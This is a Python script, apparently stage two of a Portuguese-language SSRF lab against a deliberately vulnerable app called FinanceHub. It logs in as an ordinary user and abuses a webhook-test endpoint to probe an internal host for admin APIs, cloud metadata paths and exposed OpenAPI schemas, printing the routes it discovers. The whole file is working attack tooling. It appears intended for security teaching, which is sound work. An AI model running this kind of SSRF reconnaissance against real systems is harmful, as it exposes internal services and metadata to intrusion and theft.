#!/usr/bin/env python3
"""
ETAPA 2 - service_prober.py
Identifica QUAL serviço roda num host:porta interno, via SSRF.

Depois de achar um host aberto (ex.: 10.5.0.15:8080), sonda caminhos comuns para
entender o que é. Corpos e códigos de resposta denunciam o serviço: uma API
administrativa responde JSON em /admin/accounts; metadados em /latest/meta-data/.
Ferramenta independente: edite o bloco CONFIGURAÇÃO abaixo e rode com Python.

    python service_prober.py
"""

import argparse
import json
import time

import httpx

# ==========================================================================
# CONFIGURAÇÃO
# ==========================================================================
APP_URL = "http://localhost:8000"   # onde a aplicação-alvo (FinanceHub) roda
USER, PASSWORD = "joao", "senha123"  # conta comum do atacante
TARGET = "10.5.0.15:8080"            # host:porta interno a sondar
# ==========================================================================

COMMON_PATHS = [
    "/", "/health", "/status",
    "/admin", "/admin/accounts", "/api", "/api/accounts",
    "/internal", "/accounts", "/users",
    "/openapi.json", "/docs", "/swagger.json",   # schemas de API costumam vazar rotas
    "/latest/meta-data/",
]


def login() -> str:
    r = httpx.post(f"{APP_URL}/auth/login",
                   json={"username": USER, "password": PASSWORD}, timeout=15)
    r.raise_for_status()
    return r.json()["access_token"]


def ssrf_get(token: str, url: str, timeout: float = 10.0) -> dict:
    start = time.perf_counter()
    try:
        r = httpx.post(f"{APP_URL}/vulnerable/webhook/test", json={"url": url},
                       headers={"Authorization": f"Bearer {token}"}, timeout=timeout)
        data = r.json().get("request", {})
    except Exception as exc:  # noqa: BLE001
        data = {"reached": False, "error": type(exc).__name__, "detail": str(exc)}
    data["_rtt_ms"] = round((time.perf_counter() - start) * 1000, 1)
    return data


def probe_paths(token, target, paths=COMMON_PATHS):
    findings = []
    for path in paths:
        r = ssrf_get(token, f"http://{target}{path}")
        if r.get("reached"):
            body = (r.get("body") or "").strip().replace("\n", " ")
            findings.append({"path": path, "status": r.get("status_code"), "snippet": body[:110]})
    return findings


def discover_endpoints(token, target):
    """Se o serviço expõe o schema OpenAPI, extrai TODAS as rotas dele."""
    r = ssrf_get(token, f"http://{target}/openapi.json")
    try:
        spec = json.loads(r.get("body") or "")
    except (json.JSONDecodeError, TypeError):
        return None
    return spec.get("paths")


def main(target):
    token = login()
    print(f"# sondando http://{target} via SSRF")
    found = [f for f in probe_paths(token, target) if f["status"] and f["status"] < 400]
    for f in found:
        print(f"{f['status']}  {f['path']}")
        if f["snippet"]:
            print(f"      {f['snippet']}")
    if not found:
        print("# nenhum caminho acessível")

    # Descoberta de endpoints: o schema OpenAPI/Swagger lista as rotas reais,
    # revelando caminhos como /admin/accounts/{username}/transactions.
    paths = discover_endpoints(token, target)
    if paths:
        print("\n# /openapi.json exposto - rotas descobertas:")
        for path, methods in paths.items():
            print(f"  {','.join(m.upper() for m in methods):5} {path}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="Sondagem de caminhos de um serviço interno via SSRF.")
    ap.add_argument("--target", default=TARGET, help="host:porta interno")
    a = ap.parse_args()
    main(a.target)
